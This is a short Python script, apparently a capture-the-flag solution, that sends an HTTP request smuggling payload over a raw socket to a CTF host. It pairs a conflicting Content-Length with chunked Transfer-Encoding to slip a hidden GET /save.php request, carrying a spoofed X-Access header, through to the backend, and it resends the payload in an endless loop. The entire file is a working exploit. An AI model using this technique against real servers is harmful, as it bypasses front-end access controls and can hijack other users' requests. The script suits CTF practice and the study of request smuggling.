import socket
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("threeofhearts.ctf.net", 5555))

req_1 = """POST / HTTP/1.1
Host: threeofhearts.ctf.net:5555
Content-Length: 67
X-Access: mine
Transfer-Encoding: chunked

0

GET /save.php HTTP/1.1
Host: threeofhearts.ctf.net:5555
foo:"""


while True:
    print("[-] Sending new request")
    sock.send(req_1.encode())

    time.sleep(5)

